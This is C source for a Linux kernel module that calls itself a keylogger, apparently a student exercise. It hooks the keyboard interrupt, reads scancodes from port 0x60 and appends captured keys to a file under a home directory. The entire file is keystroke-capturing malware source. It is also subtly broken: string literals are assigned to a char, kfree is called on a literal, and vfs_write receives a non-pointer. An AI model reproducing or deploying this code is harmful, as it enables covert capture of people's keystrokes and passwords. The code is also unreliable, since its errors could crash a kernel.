#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/workqueue.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>

#define QUEUE_NAME "WQsched.c"

void* HANDLER_KEY;
//struct tasklet_struct *kl_tasklet;
static struct workqueue_struct *work_queue;
static unsigned char scancode;
struct file* file;
mm_segment_t old_fs;
loff_t pos;
int block_size = 1;
// struct mutex *worker_mutex;

char buf[128];

DEFINE_MUTEX(worker_mutex);
struct file *file_open(const char *path, int flags, int rights);

static void work_handler(struct work_struct* work){
	mutex_lock(&worker_mutex);
	char c;
	switch(scancode){
		case 0x02:  c = "1";//printk (KERN_INFO "pressed 1\n");
              		break;
  		case 0x03:  printk (KERN_INFO "pressed 2\n");
              		break;
  		case 0x04:  printk (KERN_INFO "pressed 3\n");
              		break;
		case 0x05:  printk (KERN_INFO "pressed 4\n");
              		break;
		case 0x06:  printk (KERN_INFO "pressed 5\n");
              		break;
		case 0x07:  printk (KERN_INFO "pressed 6\n");
              		break;
		case 0x08:  printk (KERN_INFO "pressed 7\n");
              		break;
		case 0x09:  printk (KERN_INFO "pressed 8\n");
              		break;			  			  			  			  			  
  		default:	c = "";
        			break;
	}
	file = file_open("/home/paydaylight/sis1/check_me.txt", O_CREAT | O_WRONLY | O_APPEND, 0);
	if (!IS_ERR(file)){
		old_fs = get_fs();
		set_fs(get_ds());
		vfs_write(file, c, block_size, &pos);
		pos = pos+block_size;
		filp_close(file, NULL);
		set_fs(old_fs);
		kfree("/home/paydaylight/sis1/check_me.txt");
		printk (KERN_INFO "pressed 1\n");
	}

	mutex_unlock(&worker_mutex);
}
// static void kl_tasklet_function(unsigned long scancode)
// {
// 	switch (scancode)
// 	{
//   		case 0x02:  printk (KERN_INFO "pressed 1\n");
//               		break;
//   		case 0x03:  printk (KERN_INFO "pressed 2\n");
//               		break;
//   		case 0x04:  printk (KERN_INFO "pressed 3\n");
//               		break;
// 		case 0x05:  printk (KERN_INFO "pressed 4\n");
//               		break;
// 		case 0x06:  printk (KERN_INFO "pressed 5\n");
//               		break;
// 		case 0x07:  printk (KERN_INFO "pressed 6\n");
//               		break;
// 		case 0x08:  printk (KERN_INFO "pressed 7\n");
//               		break;
// 		case 0x09:  printk (KERN_INFO "pressed 8\n");
//               		break;			  			  			  			  			  
//   		default:
//         			break;
// 	}
// }

irqreturn_t kl_handler(int irq, void *dev_id)
{
  unsigned char status;
	static struct work_struct work;
	INIT_WORK(&work, work_handler);

	status = inb(0x64);
  scancode = inb(0x60);
	//kl_tasklet = kmalloc(sizeof(struct tasklet_struct), GFP_KERNEL);
	//tasklet_init(kl_tasklet, kl_tasklet_function, scancode);
	//tasklet_schedule(kl_tasklet);
	queue_work(work_queue, &work);

  return IRQ_HANDLED;
}

static int __init keylogger_init(void)
{
	pos = 0;
	file = NULL;
	work_queue = create_workqueue(QUEUE_NAME);
  HANDLER_KEY = (void *)(kl_handler);
  return request_irq (1, (irq_handler_t) kl_handler,IRQF_SHARED,"keylogger", HANDLER_KEY);
}

static void __exit keylogger_exit(void)
{
	//tasklet_kill(kl_tasklet);
  free_irq(1, HANDLER_KEY);
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
